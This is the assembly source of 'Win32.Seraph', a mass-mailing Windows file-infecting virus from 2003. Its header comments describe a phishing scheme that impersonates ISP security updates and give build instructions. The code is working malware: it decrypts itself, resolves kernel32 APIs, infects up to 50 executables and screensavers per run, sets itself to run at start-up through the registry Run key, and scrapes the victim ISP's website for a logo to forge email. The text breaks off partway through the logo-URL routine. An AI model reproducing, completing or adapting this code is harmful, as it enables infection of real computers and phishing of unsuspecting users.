
;
; [ Win32.Seraph@mm     Vorgon/iKX ]       
; [ 28672 bytes        Target - PE ]        
; [ 09/28/03        Made in Canada ]
; 
;
;
;
; [ Introduction ]
;
; Seraph is a mass-mailing virus that takes advantage of social engineering. This may sound
; boring to you, but it takes social engineering to the next level. Seraph is an information
; gatherer. It takes data from websites, computers, URL's and uses what it finds to generate 
; a convincing and personal email message. 
; 
; So what information does Seraph gather? Seraph gathers information about the Internet service
; provider of the computers it infects. Information such as:    
;   
;   ISP Name          example: AOL
;   Domain            example: AOL.COM
;   Website           example: WWW.AOL.COM
;   Logo              example: HTTP://www.aol.com/logo.gif
;   Deadline          example: SEPTEMBER 21, 2003
;   Copyright String  example: (C) 2003 AOL INC.
;
; What does Seraph do with this information? Seraph takes everything you see above and generates 
; an email message in HTML format. The message containing a logo image, names, valid email 
; addresses, etc, appears to be a security update from your ISP. Unsuspecting victims reading this
; email message see that they must install the attached update by the deadline date, or face 
; disconnection of there Internet service.   
;
; How does Seraph know the email addresses of other people on the same ISP? Seraph takes a list
; of the 1024 most popular surnames in the USA and randomly selects one. It then a appends a first
; initial either the start or the end of the surname. This gives a possible 53238 email addresses
; per ISP.  
;
; Sure this will spread to users on the same ISP, but how does it spread to other ISP's? Seraph 
; is highly infectious. Every time it runs it infects 50 files on all drives it can find on a
; computer, except CD-ROM and drive A. It will naturally find executables in file sharing
; directories, shared folders, and anything else you can imagine.
;
;
; [ Other ]
;
; I named this virus after Seraph from the Matrix Reloaded. Seraph (the Chinese guy Neo meets 
; before meeting the Oracle) had golden code and was so spectacular because he came from the first 
; incarnation of the matrix, which was heaven. "Seraph" is singular for the plural "seraphim". The 
; seraphim are the highest choir of angels and included amongst others: Lucifer, Gabriele, Raziel 
; and Malaciah, and they sit on the 8th level of Heaven just one below God.  
;
;
; [ Bug Fixes ]
;
; Below are a list of bugs i have fixed in this version.
;
; -The find file code begins searching at the start of the first drive instead of the current
;  Directory. This bug was causing the entire contents of the most important drive to be excluded 
;  from the search.
;
; -Files in the system directory are no longer infected. Infecting files in this directory was
;  causing Windows to not boot at all.
;
; -The program to be run on start-up is no longer whatever infected program is executed. It has
;  been changed to the program that was last infected. Before if the user deleted the infected
;  email attachment after executing the virus it would not be able to run on start-up. 
;
;  
; [ The Infection ]
;
; Below is a break down of what the virus does in order:
;
; - Decrypt the virus
; - Get the address of GetModuleHandleA
; - Get the kernel32.dll address
; - Get the address of GetProcAddress
; - Load the win9x API functions
; - Create a thread to execute the rest of the virus code
; - Infect 50 files on drives B-Z, excluding CD-ROM 
; - Make the last file infected run on start-up
; - Display an install message if the filename is patch110.exe
; - On February 23 display the pay load
; - Load the win2k API functions if the OS version permits
; - Get the IP address of the computer
; - Get the hostname of the computer
; - Extract the ISP domain from the host name of the computer
; - Download the main page of the internet service provider and handle redirections
; - Search the webpage for a logo image URL
; - Get the company name of the ISP
; - Create a dead line date for the email message
; - Generate an email address
; - Create the email message using all the data collected
; - Send the email message
; - Send the current host EXE as the update attachment.
; - Exit the thread
;
;
; [ Assembling ]
;
;  tasm32 /ml /jLOCALS seraph
;  tlink32 -aa -x /Tpe /c seraph,seraph,,import32.lib,, 
;  editbin /SECTION:CODE,rwe seraph.exe
;
;
; [ Greetz ]
; 
; T00fic, Morphine, Eddow, Raid, Gigabyte, Kefi, SPTH, Kernel32
;
;

.486p
.MODEL flat, stdcall
   EXTRN   GetModuleHandleA     : PROC

;-------------------------------------------------------------------------------------------------;
; Constants                                                                                       ;
;-------------------------------------------------------------------------------------------------;

    ; file I/O constants
    OPEN_EXISTING             EQU 3
    GENERIC_READ              EQU 80000000h   
    GENERIC_WRITE             EQU 40000000h
    FILE_SHARE_READ           EQU 1
    FILE_SHARE_WRITE          EQU 2
    FILE_BEGIN                EQU 0
    FILE_END                  EQU 2

    ; DNS constants
    DNS_QUERY_STANDARD        EQU 0
    DNS_TYPE_PTR              EQU 12
    DNS_TYPE_MX               EQU 15
    DNSREC_ANSWER             EQU 1
    DNS_FREE_RECORD_LIST_DEEP EQU 1

    ; winsock constants
    AF_INET                   EQU 2
    SOCK_STREAM               EQU 1
    PCL_NONE                  EQU 0
    SO_RCVTIMEO               EQU 1006h
    SO_SNDTIMEO               EQU 1005h
    SOL_SOCKET                EQU 0FFFFh    

    ; registry constants
    HKEY_LOCAL_MACHINE        EQU 80000002h
    REG_SZ                    EQU 1

    ; MISC constants
    GMEM_FIXED                EQU 0
    SECTION_RWE               EQU 0E0000020h
    TRUE                      EQU 1
    FALSE                     EQU 0
    EXIT_THREAD               EQU 1
    CRLF                      EQU 13, 10
    DRIVE_CDROM               EQU 5

;-------------------------------------------------------------------------------------------------;
; Structures                                                                                      ;
;-------------------------------------------------------------------------------------------------;

    PE_HEADER                               STRUC 
        dwSignature                         DD 0 
        wMachine                            DW 0
        wNumberOfSections                   DW 0
        dwTimeDateStamp                     DD 0
        dwPointerToSymbolTable              DD 0
        dwNumberOfSymbols                   DD 0
        wSizeOfOptionalHeader               DW 0
        wCharacteristics                    DW 0
        wMagic                              DW 0
        cMajorLinkerVersion                 DB 0
        cMinorLinkerVersion                 DB 0
        dwSizeOfCode                        DD 0
        dwSizeOfInitializedData             DD 0
        dwSizeOfUninitializedData           DD 0
        dwAddressOfEntryPoint               DD 0
        dwBaseOfCode                        DD 0
        dwBaseOfData                        DD 0
        dwImageBase                         DD 0
        dwSectionAlignment                  DD 0
        dwFileAlignment                     DD 0
        wMajorOperatingSystemVersion        DW 0
        wMinorOperatingSystemVersion        DW 0
        wMajorImageVersion                  DW 0
        wMinorImageVersion                  DW 0
        wMajorSubsystemVersion              DW 0
        wMinorSubsystemVersion              DW 0
        dwReserved1                         DD 0
        dwSizeOfImage                       DD 0
        dwSizeOfHeaders                     DD 0
        dwCheckSum                          DD 0
        wSubsystem                          DW 0
        wDllCharacteristics                 DW 0
        dwSizeOfStackReserve                DD 0
        dwSizeOfStackCommit                 DD 0
        dwSizeOfHeapReserve                 DD 0
        dwSizeOfHeapCommit                  DD 0
        dwLoaderFlags                       DD 0
        dwNumberOfRvaAndSizes               DD 0
        dwExportDirectoryVA                 DD 0
        dwExportDirectorySize               DD 0
        dwImportDirectoryVA                 DD 0
        dwImportDirectorySize               DD 0 
        dwResourceDirectoryVA               DD 0
        dwResourceDirectorySize             DD 0
        dwExceptionDirectoryVA              DD 0
        dwExceptionDirectorySize            DD 0
        dwSecurityDirectoryVA               DD 0
        dwSecurityDirectorySize             DD 0 
        dwBaseRelocationTableVA             DD 0
        dwBaseRelocationTableSize           DD 0
        dwDebugDirectoryVA                  DD 0
        dwDebugDirectorySize                DD 0
        dwArchitectureSpecificDataVA        DD 0
        dwArchitectureSpecificDataSize      DD 0
        dwRVAofGPVA                         DD 0
        dwRVAofGPSize                       DD 0
        dwTLSDirectoryVA                    DD 0
        dwTLSDirectorySize                  DD 0
        dwLoadConfigurationDirectoryVA      DD 0
        dwLoadConfigurationDirectorySize    DD 0
        dwBoundImportDirectoryinheadersVA   DD 0
        dwBoundImportDirectoryinheadersSize DD 0
        dwImportAddressTableVA              DD 0
        dwImportAddressTableSize            DD 0
        dwDelayLoadImportDescriptorsVA      DD 0
        dwDelayLoadImportDescriptorsSize    DD 0
        dwCOMRuntimedescriptorVA            DD 0
        dwCOMRuntimedescriptorSize          DD 0
        dwNULL1                             DD 0
        dwNULL2                             DD 0
    PE_HEADER                               ENDS
 
    SECTION_HEADER             STRUC
        sAnsiName              DB 8 DUP(0) 
        dwVirtualSize          DD 0 
        dwVirtualAddress       DD 0  
        dwSizeOfRawData        DD 0 
        dwPointerToRawData     DD 0
        dwPointerToRelocations DD 0
        dwPointerToLinenumbers DD 0
        wNumberOfRelocations   DW 0
        wNumberOfLinenumbers   DW 0
        dwCharacteristics      DD 0
    SECTION_HEADER             ENDS

    DOS_HEADER                 STRUC
        wSignature             DW 0
        wBytesInLastBlock      DW 0
        wBlocksInFile          DW 0
        wNumberOfRelocs        DW 0
        wHeaderParagraphs      DW 0
        wMinExtraParagraphs    DW 0
        wMaxExtraParagraphs    DW 0
        wSS                    DW 0
        wSP                    DW 0
        wChecksum              DW 0
        wIP                    DW 0
        wCS                    DW 0
        wRelocTableOffset      DW 0
        wOverlayNumber         DW 0
        sUnused                DB 32 DUP(0)
        lpPEHeader             DD 0
    DOS_HEADER                 ENDS

    WSA_DATA                   STRUC
        wVersion               DW 0
        wHighVersion           DW 0
        szDescription          DB 257 dup(0)
        szSystemStatus         DB 129 dup(0)
        iMaxSockets            DW 0
        iMaxUdpDg              DW 0
        lpVendorInfo           DD 0
    WSA_DATA                   ENDS

    SOCK_ADDRESS               STRUC
        sin_family             DW 0
        sin_port               DW 0
        sin_addr               DD 0
        sin_zero               DB 8 dup(0)
    SOCK_ADDRESS               ENDS

    DNS_RECORD                 STRUC
        pNext                  DD 0
        pName                  DD 0
        wType                  DW 0
        wDataLength            DW 0
        flags                  DD 0
        dwTtl                  DD 0
        dwReserved             DD 0
    DNS_RECORD                 ENDS

    SYSTEM_TIME                STRUC
        wYear                  DW 0
        wMonth                 DW 0
        wDayOfWeek             DW 0
        wDay                   DW 0
        wHour                  DW 0
        wMinute                DW 0
        wSecond                DW 0
        wMiliseconds           DW 0
    SYSTEM_TIME                ENDS

    WIN32_FIND_DATA            STRUC    
        FileAttributes         DD 0
        CreateTime             DQ 0
        LastAccessTime         DQ 0
        LastWriteTime          DQ 0
        FileSizeHigh           DD 0
        FileSizeLow            DD 0
        Reserved0              DD 0
        Reserved1              DD 0
        FullFileName           DB 260 dup(0)
        AlternateFileName      DB 14 dup(0)
    WIN32_FIND_DATA            ENDS

;-------------------------------------------------------------------------------------------------;
; Macros                                                                                          ;
;-------------------------------------------------------------------------------------------------;

    ImportTable         MACRO   tableName
                        &tableName:
                        ENDM

    EndImport           MACRO
                        DB 0
                        ENDM

    EndImportTable      MACRO
                        DB '$'
                        ENDM    

    ImportDll           MACRO   dllName
                        sz&dllName DB '&dllName', '.dll', 0
                        ENDM

    ImportFunction      MACRO   functionName
                        sz&functionName DB '&functionName', 0
                        &functionName   DD 0
                        ENDM

    ApiCall             MACRO   functionName
                        call    [ebp+&functionName]
                        ENDM

    pushptr             MACRO   variable
                        lea     eax, [ebp+&variable]
                        push    eax     
                        ENDM

    pushval             MACRO   variable
                        push    [ebp+&variable]
                        ENDM

.DATA  

    DD 0  ; TASM gayness

;-------------------------------------------------------------------------------------------------;
; Code Section                                                                                    ;
;-------------------------------------------------------------------------------------------------;

.CODE      
main: 

;-------------------------------------------------------------------------------------------------;
; Load the virus and its resources.                                                               ;
;-------------------------------------------------------------------------------------------------;

    ; get the delta pointer
    call    getDeltaPointer                        ; where am i?!?!
getDeltaPointer:
    pop     edi
    mov     ebp, edi
    sub     ebp, offset getDeltaPointer
    
    ; very basic XOR decryption to hide strings
    cmp     ebp, 0
    je      encrypted
    lea     esi, [ebp+encrypted]
    mov     ecx, CODE_SIZE - (offset encrypted - offset main)
decrypt:
    xor     byte ptr [esi], 123
    inc     esi
    loop    decrypt
   
    ; all code from this point on will be encrypted      
encrypted:

    ; get the image base
    sub     edi, 5
    mov     [ebp+lpStartOfCode], edi               ; save the start of code
    and     edi, 0FFFFF000h                        ; round off the VA to the nearest page
findImageBase:
    cmp     word ptr [edi], 'ZM'                   ; start of image?
    je      findKernel
    sub     edi, 1000h
    jmp     findImageBase

    ; find the address of the kernel32
findKernel:
    mov     [ebp+lpImageBase], edi

    mov     eax, edi
    mov     ebx, [eax+3ch]                         ; ebx = pointer to the PE header
    mov     esi, [ebx+eax+128] 
    add     esi, eax                               ; esi = pointer to the import section
    xor     ecx, ecx    
findKernel32:
    mov     ebx, [esi+ecx+12]                      ; get an RVA to the dll name
    cmp     ebx, 0                                 ; no more dll's left?
    je      returnHostControl                
    add     ebx, eax
    cmp     dword ptr [ebx], 'NREK'                ; Kernel32.dll found?
    je      findGetModuleHandleA
    add     ecx, 20                                ; next import
    jmp     findKernel32    
findGetModuleHandleA:    
    mov     edx, [esi+ecx]
    sub     edx, 4    
    lea     esi, [esi+ecx]
    xor     ecx, ecx
findName:
    inc     ecx
    add     edx, 4               
    mov     ebx, [edx+eax]                         ; next name
    cmp     ebx, 0                                 ; no more function names left?
    je      returnHostControl
    lea     ebx, [ebx+eax+2]
    cmp     dword ptr [ebx], 'MteG'
    jne     findName
    cmp     dword ptr [ebx+4], 'ludo'
    jne     findName
    cmp     dword ptr [ebx+8], 'naHe'
    jne     findName
    cmp     dword ptr [ebx+12], 'Aeld'             ; GetModuleHandleA?
    jne     findName

    ; get the address of the GetModuleHandleA function
    mov     esi, [esi+16]
    add     esi, eax
    rep     lodsd

    ; create the string "kernel32.dll" on the stack
    push    0
    push    dword ptr 'lld.'
    push    dword ptr '23le'
    push    dword ptr 'nrek'
      
    ; call GetModuleHandleA to retrieve the address of the kernel32.dll
    push    esp
    call    eax
                  
    mov     [ebp+lpKernel32], eax                  ; save the kernel32 address 

    ; get the address of the GetProcAddress API function
    mov     ebx, [eax+3ch]        
    add     ebx, eax
    mov     ebx, [ebx+120]                         ; get the export table VA                         
    add     ebx, eax
    mov     esi, [ebx+28]                          ; get the VA of the address table
    add     esi, eax
    mov     edi, [ebx+32]                          ; get the VA of the name table
    add     edi, eax
    mov     ecx, [ebx+36]                          ; get the VA of the ordinal table                           
    add     ecx, eax       
findGetProcAddress:        
    add     ecx, 2                                 ; next ordinal
    add     edi, 4                                 ; next name
    mov     edx, [edi]    
    add     edx, eax 
    cmp     dword ptr [edx], 'PteG'
    jne     findGetProcAddress
    cmp     dword ptr [edx+4], 'Acor'              ; GetProcAddress?
    jne     findGetProcAddress
    mov     cx, [ecx]
    and     ecx, 0FFFFh
    add     ecx, [ebx+16]                          ; add ordinal base
    rep     lodsd                                  ; get the VA address corrasponding to the ordinal 
    add     eax, [ebp+lpKernel32]
    mov     [ebp+GetProcAddress], eax

    ; get the address of the LoadLibraryA API function
    pushptr szLoadLibraryA
    pushval lpKernel32     
    ApiCall GetProcAddress
    mov     [ebp+LoadLibraryA], eax

    ; load the Windows 9x API functions
    lea     eax, [ebp+API_Imports_9x]
    call    LoadImports  
    cmp     eax, -1
    je      apiLoadError

    ; create a thread to execute the rest of the code
    pushptr hThread
    push    0
    push    ebp                                    ; pass the delta pointer to the thread 
    pushptr background
    push    0
    push    0
    ApiCall CreateThread

    ; if /iKX is present in the command line then loop until the thread closes
    ApiCall GetCommandLineA
    mov     ecx, 256
parseCommandLine:
    cmp     dword ptr [eax], 'XKi/'
    je      wait
    inc     eax
    loop    parseCommandLine

    ; if this is not the first generation then return control to the host
    cmp      ebp, 0
    jne      returnHostControl    

    ; if this is the first generation then loop until the thread closes
wait:
    cmp     [ebp+dwThreadStatus], EXIT_THREAD
    jne     wait
    push    0
    ApiCall ExitProcess

    ; return control to the host
returnHostControl:
    mov     eax, [ebp+lpReturnAddress]
    add     eax, [ebp+lpImageBase]
    push    eax
    ret

    ; if an api function cannot be loaded then either return control to the host or exit program
apiLoadError:
    cmp     ebp, 0
    jne     returnHostControl
    push    0
    ApiCall ExitProcess    

;-------------------------------------------------------------------------------------------------;
; Background Thread.                                                                              ;
;-------------------------------------------------------------------------------------------------;

background:

    mov     ebp, [esp+4]                           ; restore the delta offset      

;-------------------------------------------------------------------------------------------------;
; Infect 50 files in drives B-Z, except the CD-ROM drive.                                         ;
;-------------------------------------------------------------------------------------------------;

    xor     esi, esi                               ; files infected counter
    mov     byte ptr [ebp+szDrive], 'A'            ; set the drive to start searching at
nextDrive:
    inc     byte ptr [ebp+szDrive]                 ; next drive
    cmp     byte ptr [ebp+szDrive], 'Z'+1          ; all drives searched?
    je      payload
    pushptr szDrive
    ApiCall GetDriveTypeA 
    cmp     eax, DRIVE_CDROM                       ; CD-ROM drive?
    je      nextDrive
    pushptr szDrive
    ApiCall SetCurrentDirectoryA                   ; set the current directory to the root of that drive
    cmp     eax, 0
    je      nextDrive    
    
findFiles:
    mov     edi, esp                               ; save the stack pointer
    push    0BAADF00Dh                             ; end of files marker
findFirstFile:
    pushptr win32FindData
    pushptr szSearchString
    ApiCall FindFirstFileA                         ; find the first file
    mov     [ebp+hFind], eax    
checkType:
    cmp     eax, 0
    je      downDirectory
    cmp     byte ptr [ebp+win32FindData.FullFileName], '.'
    je      findNextFile
    cmp     [ebp+win32FindData.FileAttributes], 10h
    je      upDirectory
    cmp     [ebp+win32FindData.FileAttributes], 30h
    je      upDirectory

    ; check the file extension for .exe or .scr
    push    edi
    mov     al, '.'
    mov     ecx, 260
    lea     edi, [ebp+win32FindData.FullFileName]
    repne   scasb                                  ; seek to the file extension
    mov     eax, [edi-1]
    pop     edi
    and     eax, 0DFDFDFFFh                        ; make upper case
    cmp     eax, 'EXE.'                            ; executable file?
    je      infectFile  
    cmp     eax, 'RCS.'                            ; screen saver?
    je      infectFile
    jmp     findNextFile    

infectFile: 

    ; check to see if the file is a valid PE executable and is not already infected
    push    esi
    push    edi
    lea     esi, [ebp+win32FindData.FullFileName]
    call    IsValid
    pop     edi
    pop     esi
    cmp     eax, -1
    je      findNextFile

    ; if the executable file is in the system directory then dont infect it
    push    256
    pushptr szSystemDirectory
    ApiCall GetSystemDirectoryA
    pushptr szSystemDirectory
    ApiCall CharUpperA
    pushptr szCurrentDirectory
    push    256
    ApiCall GetCurrentDirectoryA
    pushptr szCurrentDirectory
    ApiCall CharUpperA
    pushptr szSystemDirectory
    pushptr szCurrentDirectory
    ApiCall lstrcmpA
    cmp     eax, 0
    je      findNextFile

    ; infect the file
    push    esi
    lea     esi, [ebp+win32FindData.FullFileName]
    call    AttachCode
    pop     esi
    cmp     eax, -1
    je      findNextFile 
    
    ; increment the file infection counter
    inc     esi
    cmp     esi, 50                                ; infect 50 files
    jne     findNextFile

    ; if 50 files have been infected stop searching 
    mov     esp, edi
    jmp     searchComplete

findNextFile:
    pushptr win32FindData
    pushval hFind
    ApiCall FindNextFileA                          ; find the next file    
    jmp     checkType

upDirectory:   
    pushptr win32FindData.FullFileName
    ApiCall SetCurrentDirectoryA
    cmp     eax, 0
    je      findNextFile
    pushval hFind                                  ; save the find handle
    jmp     findFirstFile    

downDirectory:
    pushptr szBackDir
    ApiCall SetCurrentDirectoryA
    pushval hFind
    ApiCall FindClose                              ; close the find handle
    pop     [ebp+hFind]                            ; restore the previous find handle
    cmp     [ebp+hFind], 0BAADF00Dh                ; no more files left to find?
    jne     findNextFile        
    mov     esp, edi                               ; restore the stack pointer
    jmp     nextDrive                              ; find another drive to infect
searchComplete:

;-------------------------------------------------------------------------------------------------;
; Make it so the last infected file runs on start-up.                                             ;
;-------------------------------------------------------------------------------------------------;

    ; copy the current path to a buffer
    pushptr szCurrentDirectory
    pushptr szModuleName
    ApiCall lstrcpyA

    ; append a slash
    pushptr szSlash
    pushptr szModuleName
    ApiCall lstrcatA   

    ; append the executable file name
    pushptr win32FindData.FullFileName
    pushptr szModuleName
    ApiCall lstrcatA

    ; concat the commandline parameter /iKX to the key value
    pushptr szIkxParameter
    pushptr szModuleName
    ApiCall lstrcatA

    ; open "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
    pushptr hKey                           
    pushptr szSubKey                        
    push    HKEY_LOCAL_MACHINE               
    ApiCall RegOpenKeyA
    cmp     eax, 0
    jne     exitThread

    ; get the length of the module name
    pushptr szModuleName
    ApiCall lstrlenA

    ; set the start-up program
    push    eax                                
    pushptr szModuleName
    push    REG_SZ                     
    push    0                            
    pushptr szValueName                 
    pushval hKey                        
    ApiCall RegSetValueExA             
              
    ; close the key
    pushval hKey
    ApiCall RegCloseKey

;-------------------------------------------------------------------------------------------------;
; Display the patch install message if the module name is "patch110.exe"                          ;
;-------------------------------------------------------------------------------------------------;

    ; get the path and name of this program
    push    256
    pushptr szModuleName
    push    0
    ApiCall GetModuleFileNameA    

    ; seek to a dot
    lea     edi, [ebp+szModuleName]
    mov     al, '.'
    mov     ecx, 256
    repne   scasb  
    
    ; seek backwards to a slash
    std
    mov     al, '\'
    repne   scasb
    cld
    add     edi, 2

    ; compair the filename to "patch110.exe"
    mov     ecx, 12
    lea     esi, [ebp+szPatchName] 
    rep     cmpsb
    cmp     ecx, 0
    jne     payload  

    ; display the patch install message
    push    0
    pushptr szPatchTitle
    pushptr szPatchInstall
    push    0
    ApiCall MessageBoxA

;-------------------------------------------------------------------------------------------------;
; Display a poem by John Keats on the day of his death.                                           ;
;-------------------------------------------------------------------------------------------------;

payload:

    ; get today's date
    pushptr date
    ApiCall GetSystemTime 

    ; Feb 23?
    cmp     [ebp+date.wMonth], 2
    jne     loadImports     
    cmp     word ptr [ebp+date.wDay], 24
    jne     loadImports

    ; display poem
    push    0
    pushptr szTitle
    pushptr szElginMarbles
    push    0
    ApiCall MessageBoxA

;-------------------------------------------------------------------------------------------------;
; Load the Windows 2k Imports.                                                                    ;
;-------------------------------------------------------------------------------------------------;

loadImports:

    ; Windows 2k+ OS?
    ApiCall GetVersion
    cmp     al, 5
    jl      exitThread

    ; load the Windows 2k API functions
    lea     eax, [ebp+API_Imports_2k]
    call    LoadImports
    cmp     eax, -1
    je      exitThread

    ; internet connection?
    push    0
    pushptr dwConnectionState
    ApiCall InternetGetConnectedState
    cmp     eax, FALSE
    je      exitThread

;-------------------------------------------------------------------------------------------------;
; Get the IP address of this computer.                                                            ;
;-------------------------------------------------------------------------------------------------;

    ; initialize winsock
    pushptr wsaData
    push    0101h
    ApiCall WSAStartup
    cmp     eax, 0
    jne     exitThread

    ; get the local host name of this computer
    push    132
    pushptr szHostName
    ApiCall gethostname
    cmp     eax, 0
    jne     exitThread

    ; clear the reverse IP buffer
    push    29
    pushptr szReverseIP
    ApiCall RtlZeroMemory

    ; get the IP address of the local host
    pushptr szHostName
    ApiCall gethostbyname
    cmp     eax, 0
    je      exitThread
    mov     eax, [eax+12]
    mov     eax, [eax]
    mov     eax, [eax]

;-------------------------------------------------------------------------------------------------;
; Get the host name of this computer.                                                             ;
;-------------------------------------------------------------------------------------------------;

getHostName:

    bswap   eax                                    ; reverse the byte order of the IP
        
    ; convert the IP address to a string
    push    eax
    ApiCall inet_ntoa

    ; copy the reverse IP string to the buffer
    push    eax
    pushptr szReverseIP
    ApiCall lstrcpyA

    ; concat the .in-addr.arpa string
    pushptr szArpa
    pushptr szReverseIP
    ApiCall lstrcatA

    ; query a DNS server for the host name of this computer
    push    0
    pushptr lpResults
    push    0
    push    DNS_QUERY_STANDARD
    push    DNS_TYPE_PTR
    pushptr szReverseIP
    ApiCall DnsQuery_A
    cmp     eax, 0
    jne     exitThread
    
    ; was an answer record found?
    push    size DNS_RECORD
    pushval lpResults
    pushptr dnsRecordHeader
    ApiCall RtlMoveMemory
    mov     eax, [ebp+dnsRecordHeader.flags]
    and     al, 00000011b
    cmp     al, DNSREC_ANSWER
    jne     exitThread

    ; clear the szHostName buffer
    push    132
    pushptr szHostName
    ApiCall RtlZeroMemory
    
    ; get the host name from the DNS response message
    mov     eax, [ebp+lpResults]
    add     eax, size DNS_RECORD
    mov     eax, [eax]
    push    eax
    pushptr szHostName
    ApiCall lstrcpyA    

    ; release the DNS record list
    push    DNS_FREE_RECORD_LIST_DEEP
    pushval lpResults
    ApiCall DnsRecordListFree

;-------------------------------------------------------------------------------------------------;
; Extract the ISP host name from this computers host name.                                        ;
;-------------------------------------------------------------------------------------------------;
    
    ; seek to the end of the domain
    lea     esi, [ebp+szHostName]
    push    esi
    ApiCall lstrlenA
    add     esi, eax
  
    ; seek backwards to a period or the start of domain
findPeriod:
    dec     esi
    lea     eax, [ebp+szHostName]
    cmp     esi, eax                               ; start of host name?
    je      copyFullDomain
    cmp     byte ptr [esi], '.'
    jne     findPeriod    
    mov     ebx, esi

    ; compair domains   
    lea     edi, [ebp+topDomains]
compairDomain:   
    mov     al, [ebx+1]
    mov     ah, [edi]
    inc     ebx
    inc     edi
    cmp     ax, 0
    je      findPeriod
    cmp     ax, 002Eh
    je      findPeriod
    cmp     al, ah
    je      compairDomain

    ; seek to the next domain in the list
    push    edi
    ApiCall lstrlenA
    add     edi, eax
    inc     edi

    ; no more domains left?
    mov     ebx, esi
    cmp     byte ptr [edi], '$'
    jne     compairDomain
    inc     esi

copyFullDomain:

    ; clear the szIspHostName buffer
    push    132
    pushptr szIspDomainName
    ApiCall RtlZeroMemory   

    ; copy the domain to a buffer
    push    esi
    pushptr szIspDomainName
    ApiCall lstrcpyA

;-------------------------------------------------------------------------------------------------;
; Download the main webpage of the Internet Service Provider.                                     ;
;-------------------------------------------------------------------------------------------------;    
    
    ; allocate 64k for the webpage
    push    65536
    push    GMEM_FIXED
    ApiCall GlobalAlloc
    cmp     eax, 0
    je      exitThread
    mov     [ebp+lpWebpage], eax	
    
    ; initialize wininet
    push    0
    push    0
    push    0
    push    0
    push    0
    ApiCall InternetOpenA
    cmp     eax, 0
    je      exitThread     
    mov     [ebp+hInternet], eax            

    ; copy the domain to a buffer
    pushptr szWWW
    pushptr szIspWebpage
    ApiCall lstrcpyA

    ; concat the ISP domain
    pushptr szIspDomainName
    pushptr szIspWebpage
    ApiCall lstrcatA

    ; open the webpage URL
openUrl:
    push    0
    push    0
    push    0
    push    0
    pushptr szIspWebpage
    pushval hInternet
    ApiCall InternetOpenUrlA  
    cmp     eax, 0
    je      exitThread
    mov     [ebp+hFile], eax

    ; download the webpage
    mov     edi, [ebp+lpWebpage]
    xor     esi, esi
downloadWebpage:
    pushptr dwNumberOfBytes
    push    65536
    push    edi
    pushval hFile
    ApiCall InternetReadFile
    add     edi, [ebp+dwNumberOfBytes]
    add     esi, [ebp+dwNumberOfBytes]
    cmp     [ebp+dwNumberOfBytes], 0
    jne     downloadWebpage
    mov     [ebp+dwWebpageSize], esi

    ; if the webpage size is greater then 500 bytes then find the logo
    cmp     esi, 500
    jg      findLogoUrl

;-------------------------------------------------------------------------------------------------;
; Handle webpage redirections.                                                                    ;
;-------------------------------------------------------------------------------------------------;

    ; find a URL in the webpage
    xor     ecx, ecx
    mov     edx, esi
    mov     edi, [ebp+lpWebpage]
    lea     esi, [ebp+szIspWebpage]
findUrl:
    mov     eax, [edi]
    and     eax, 00FFFFFFh
    cmp     eax, 2F2F3Ah
    je      findUrlStart
    inc     edi
    inc     ecx
    cmp     ecx, edx
    jne     findUrl
    jmp     exitThread
     
    ; find the start of the URL
findUrlStart:
    cmp     byte ptr [edi], '"'
    je      copyUrl                    
    cmp     byte ptr [edi], ' '
    je      copyUrl
    cmp     byte ptr [edi], '='
    je      copyUrl
    cmp     byte ptr [edi], '('
    je      copyUrl
    dec     edi
    dec     ecx
    cmp     ecx, 0
    jne     findUrlStart
    jmp     exitThread 

    ; copy the URL to a buffer
copyUrl:
    inc     edi
    inc     ecx
    mov     al, [edi]
    mov     [esi], al         
    inc     esi
    cmp     ecx, edx
    je      exitThread
    cmp     al, '"'
    je      copyComplete
    cmp     al, ' '
    je      copyComplete
    cmp     al, ')'
    je      copyComplete
    jmp     copyUrl            

    ; zero terminate the URL and download the webpage
copyComplete:
    mov     byte ptr [esi-1], 0
    jmp     openUrl
           
;-------------------------------------------------------------------------------------------------;
; Find a logo image URL on the webpage.                                                           ;
;-------------------------------------------------------------------------------------------------;        

findLogoUrl:

    ; find the word "logo"
    xor     ecx, ecx
    mov     esi, [ebp+lpWebpage]
    lea     edi, [ebp+szUrl] 
findLogo:  
    mov     eax, [esi]
    and     eax, 0DFDFDFDFh
    cmp     eax, 'OGOL'
    je      findType
    cmp     ecx, [ebp+dwWebpageSize]
    je      exitThread 
    inc     esi
    inc     ecx 
    jmp     findLogo

    ; find the file extension ".gif" or ".jpg"
findType: 
    mov     eax, [esi]
    cmp     al, ' '
    je      findLogo
    and     eax, 0DFDFDFFFh
    cmp     eax, 'FIG.'
    je      findImgStart
    cmp     eax, 'GPJ.'
    je      findImgStart
    cmp     ecx, [ebp+dwWebpageSize]
    je      exitThread
    inc     esi
    inc     ecx
    jmp     findType

    ; find the start of the image URL
findImgStart:
    mov     al, [esi]
    cmp     al, ' '
    je      copyImage    
    cmp     al, '='
    je      copyImage
    cmp     al, '('
    je      copyImage
    cmp     al, '"'
    je      copyImage
    cmp     ecx, 0
    je      exitThread
    dec     esi
    dec     ecx
    jmp     findImgStart

    ; copy the image URL to a buffer   
copyImage:
    inc     esi
    mov     al, [esi]
    mov     [edi], al
    cmp     al, ' '
    je      imageCopied
    cmp     al, '"'
    je      imageCopied
    cmp     al, ')'
    je      imageCopied
    cmp     al, '>'
    je      imageCopied
    cmp     ecx, [ebp+dwWebpageSize]
    je      exitThread
    inc     ecx
    inc     edi 
    jmp     copyImage       
imageCopied:        
    mov     byte ptr [edi], 0

    ; only the image name specified in the URL?        
    lea     edi, [ebp+szUrl]
    mov     ecx, 132
    mov     al, '/'
    repne   scasb
    mov     edx, 1
    jecxz   makeFullUrl

    ; only the image path/name specified in the URL?
    lea     edi, [ebp+szUrl]
    mov     ecx, 132
    mov     al, ':'
    repne   scasb
    mov     edx, 0
    jecxz   makeFullUrl

    ; copy the full URL to a buffer
    pushptr szUrl
    pushptr szLogoUrl
    ApiCall lstrcpyA
    jmp     logoParseComplete
        
    ; create a complete URL containing a scheme, hostname and path.       
makeFullUrl:
    lea     edi, [ebp+szIspWebpage]
    mov     ecx, 132
    mov     al, '.'
    repne   scasb
    mov     eax, 132
    sub     eax, ecx
    mov     ecx, eax
findDomainEnd:
    inc     ecx
    inc     edi
    cmp     ecx, 132
    je      exitThread
    mov     al, [edi]
    cmp     al, 0
    je      copyDomain
    cmp     al, '/'
    je      copyDomain 
    jmp     findDomainEnd
copyDomain:        
    lea     edi, [ebp+szLogoUrl]
    lea     esi, [ebp+szIspWebpage]
    rep     movsb
    cmp     edx, 0
    je      concatPath
    mov     byte ptr [edi], '/'
